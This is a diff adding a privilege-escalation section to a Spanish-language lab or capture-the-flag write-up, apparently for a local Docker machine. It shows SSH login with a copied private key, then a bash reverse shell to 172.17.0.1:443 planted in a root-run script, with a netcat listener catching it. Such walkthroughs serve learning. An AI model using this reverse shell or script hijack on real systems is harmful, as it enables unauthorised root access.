@@ -104,5 +104,11 @@ Y encotre archivos .txt que no pude leer asi que ejecute ;la -la /home/samara/.s
 Copias el archivo en nano id_rsa cambiamos los permisos chmod 700 id_rsa y ejecutamos ssh -i id_rsa samara@172.17.0.3 para entrar con exito al servicio SSH
 ![Usuarios](Imágenes/Capturas_13.png)
 
+Primero, ejecute `ps aux` para identificar procesos en ejecución ya que no econtre nada con sudo -l o find / -perm -4000 2>/dev/null, descubriendo que `/usr/local/bin/echo.sh` se ejecutaba en bucle como root. Entre al directorio con `cd /usr/local/bin` y listó archivos con `ls`, encontrando `echo.sh`. Intentó editar con `nano`, pero falle por el valor de `TERM`, que solucione con `export TERM=xterm`. Luego, use `nano echo.sh` para insertar una reverse shell: `bash -i >& /dev/tcp/172.17.0.1/443 0>&1`. Finalmente, confirme la edición con `cat echo.sh` y ejecute /bin/bashbash -i >& /dev/tcp/172.17.0.1/443 0>&1 para en otra terminal ejecutar sudo nc -lvnp 443 y tener acceso a la terminal root.
+![Usuarios](Imágenes/Capturas_14.png)
+
+---
+
+![Usuarios](Imágenes/Capturas_15.png)
 
 
